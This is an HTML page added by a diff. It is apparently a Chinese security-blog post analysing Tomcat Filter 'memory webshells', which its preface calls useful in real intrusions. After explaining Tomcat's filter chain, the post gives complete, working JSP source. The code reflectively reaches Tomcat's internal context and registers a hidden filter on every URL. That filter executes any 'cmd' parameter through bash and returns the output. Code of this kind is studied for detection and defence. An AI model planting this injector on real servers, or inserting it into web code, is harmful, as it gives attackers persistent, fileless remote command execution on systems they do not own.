@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Blog Of SEVENTEEN</title>
+
+    <link rel = "Shortcut Icon" href="../img/favicon.ico">
+
+    <!-- Bootstrap core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom fonts for this template -->
+    <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet'
+          type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
+          rel='stylesheet' type='text/css'>
+
+    <!-- Custom styles for this template -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Code highlight-->
+    <link rel="stylesheet" href="../highlight/styles/ashes.min.css">
+    
+    <!-- fancybox-->
+    <link  href="../css/jquery.fancybox.min.css" rel="stylesheet">
+    
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+        <a class="navbar-brand" href="../index.html">Index</a>
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
+                data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+                aria-label="Toggle navigation">
+            Menu
+            <i class="fas fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="../index.html">Home</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../about.html">About</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../contact.html">Contact</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+<!-- Page Header -->
+<header class="masthead" style="background-image: url('../img/post-bg.jpeg')">
+    <div class="overlay"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <div class="post-heading">
+                    <h1>Tomcat Filter内存马原理分析</h1>
+                    <h2 class="subheading">Tomcat Filter内存马原理分析</h2>
+                    <span class="meta">Posted by
+              <a href="#">SEVENTEEN</a>
+              on March 15, 2022</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+
+                <h2 class="section-heading">前言</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;内存马作为内网入口点在实战中的意义非常大，之前实战中一般使用内存马作为jsp木马被删之后的保险之一，
+                这次来学习一下内存马的原理。</p>
+                	
+                	
+                <h2 class="section-heading">Filter与Servlet</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;Filter功能是在Servlet之前先接受请求对请求做一些检查以及处理，做一些处理后再交给下一个过滤器或servlet处理，
+                  而先调用哪个Filter由Filter在web.xml文件中的注册顺序决定，这些Filter形成了一个链式过滤。Servlet在接收到请求后，根据代码逻辑进行控制返回的页面。</p>
+            
+            
+                <p>&nbsp;&nbsp;&nbsp;Servlet实例在服务器启动时就会被加载，之后调用init()方法进行初始化。
+                  而接收请求的过程都只调用doGet()或者doPost()方法，在停止服务器时调用destroy()方法摧毁实例。</p>
+              
+              
+              <p>&nbsp;&nbsp;&nbsp;Filter也是在启动时加载其实例，调用init()来完成初始化。
+              接受请求时只调用doFilter()方法来处理，在停止服务器时调用destroy()方法摧毁实例。</p>
+            
+            
+              <p>&nbsp;&nbsp;&nbsp;所以要想实现内存马，可以在Filter链前动态注册一个Filter，优先处理对应路由与执行命令有关的请求。</p>
+              
+              
+              
+              
+                <h2 class="section-heading">Tomcat Filter拦截过程</h2>
+                
+              <p>&nbsp;&nbsp;&nbsp;url请求的总体过程是:</p>
+                
+              <p>1. 根据请求的URL从FilterMaps中找出与之URL对应的Filter名称。</p>
+                <p>(在FilterMap中主要存放了FilterName和对应的URLPattern，也就是待拦截的url)</p>
+              
+              <p>2. 根据步骤1中获取的Filter名称去FilterConfigs中寻找对应名称的FilterConfig。</p>
+                <p>(FilterConfigs存放filterConfig的数组，而FilterConfig中存放FilterDef和Filter对象等信息)</p>
+              
+              <p>3. 找到对应的FilterConfig之后添加到FilterChain中，并且返回FilterChain。</p>
+                <p>(使用doFilter方法能依次调用链上的Filter)</p>
+              
+              <p>4. filterChain中调用internalDoFilter遍历获取chain中的FilterConfig，然后从FilterConfig中获取Filter，
+                然后调用Filter的doFilter方法。</p>
+              
+              
+              
+              <h2 class="section-heading">Tomcat Filter内存马原理</h2>
+              
+              <p>1. 获取standardContext上下文</p>
+              
+              <p>2. 创建恶意的Filter</p>
+              
+              <p>3. 使用filterDef封装Filter对象，将filterDef添加到filterDefs</p>
+              <p>(FilterDefs中存放FilterDef，FilterDef中存储着过滤器名和过滤器实例，作用的url等信息)</p>
+              
+              <p>4. 创建filterMap，将URL和filter进行绑定，添加到filterMaps中</p>
+              
+              <p>5. 使用ApplicationFilterConfig封装filterDef对象，添加到filterConfigs中</p>
+              
+              
+              <h2 class="section-heading">Tomcat Filter内存马源码</h2>
+              
+
+              
+              <div>
+              	
+<pre class='hljs'><code>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.lang.reflect.Field"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"org.apache.catalina.core.StandardContext"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.util.Map"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.IOException"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.lang.reflect.Constructor"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"org.apache.catalina.core.ApplicationFilterConfig"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"org.apache.catalina.Context"</span> %&gt;
+&lt;%@ page language=<span class="hljs-string">"java"</span> contentType=<span class="hljs-string">"text/html; charset=UTF-8"</span> pageEncoding=<span class="hljs-string">"UTF-8"</span>%&gt;
+
+&lt;%
+    <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> name = <span class="hljs-string">"exp"</span>;
+
+    <span class="hljs-comment">// 获取上下文</span>
+    ServletContext servletContext = request.getSession().getServletContext();
+
+    Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">"context"</span>);
+    appctx.setAccessible(<span class="hljs-keyword">true</span>);
+    ApplicationContext applicationContext = (ApplicationContext) appctx.<span class="hljs-built_in">get</span>(servletContext);
+
+    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">"context"</span>);
+    stdctx.setAccessible(<span class="hljs-keyword">true</span>);
+    StandardContext standardContext = (StandardContext) stdctx.<span class="hljs-built_in">get</span>(applicationContext);
+
+    Field Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">"filterConfigs"</span>);
+    Configs.setAccessible(<span class="hljs-keyword">true</span>);
+    Map filterConfigs = (Map) Configs.<span class="hljs-built_in">get</span>(standardContext);
+
+    <span class="hljs-comment">// 判断是否存在Filter名称，没有的话创建恶意的filter</span>
+    <span class="hljs-keyword">if</span> (filterConfigs.<span class="hljs-built_in">get</span>(name) == <span class="hljs-keyword">null</span>){
+        Filter <span class="hljs-built_in">filter</span> = <span class="hljs-keyword">new</span> Filter() {
+            @Override
+            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> init(FilterConfig filterConfig) <span class="hljs-keyword">throws</span> ServletException {
+
+            }
+
+            @Override
+            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) <span class="hljs-keyword">throws</span> IOException, ServletException {
+                HttpServletRequest req = (HttpServletRequest) servletRequest;
+                <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">"cmd"</span>) != <span class="hljs-keyword">null</span>){
+                    <span class="hljs-built_in">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[<span class="hljs-number">1024</span>];
+                    Process process = <span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">"bash"</span>,<span class="hljs-string">"-c"</span>,req.getParameter(<span class="hljs-string">"cmd"</span>)).start();
+                    <span class="hljs-built_in">int</span> len = process.getInputStream().read(bytes);
+                    servletResponse.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-keyword">String</span>(bytes,<span class="hljs-number">0</span>,len));
+                    process.destroy();
+                    <span class="hljs-keyword">return</span>;
+                }
+                filterChain.doFilter(servletRequest,servletResponse);
+            }
+
+            @Override
+            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> destroy() {
+            }
+        };
+
+        FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();
+        filterDef.setFilter(<span class="hljs-built_in">filter</span>);
+        filterDef.setFilterName(name);
+        filterDef.setFilterClass(<span class="hljs-built_in">filter</span>.getClass().getName());
+
+        <span class="hljs-comment">// 将filterDef添加到filterDefs中</span>
+        standardContext.addFilterDef(filterDef);
+
+        <span class="hljs-comment">// 绑定url</span>
+        FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();
+        filterMap.addURLPattern(<span class="hljs-string">"/*"</span>);
+        filterMap.setFilterName(name);
+        filterMap.setDispatcher(DispatcherType.REQUEST.name());
+
+        standardContext.addFilterMapBefore(filterMap);
+
+        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+        constructor.setAccessible(<span class="hljs-keyword">true</span>);
+        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
+
+        filterConfigs.put(name,filterConfig);
+        System.out.<span class="hljs-built_in">print</span>(<span class="hljs-string">"Inject Success !"</span>);
+    }
+%&gt;</code></pre>
+              	
+              </div>
+                
+              
+                
+
+
+              
+              
+           
+                <h2 class="section-heading">There Is Nothing Below</h2>
+                <p>&nbsp;&nbsp;&nbsp;</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+                <span class="caption text-muted">Turn at the next intersection.</span>
+
+                <blockquote class="blockquote">
+                </blockquote>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <ul class="list-inline text-center">
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; SEVENTEEN 2022</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- Bootstrap core JavaScript -->
+<script src="../vendor/jquery/jquery.min.js"></script>
+<script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<!-- Custom scripts for this template -->
+<script src="../js/clean-blog.min.js"></script>
+
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+<script src="../js/jquery.fancybox.min.js"></script>
+                  
+</body>
+
+</html>
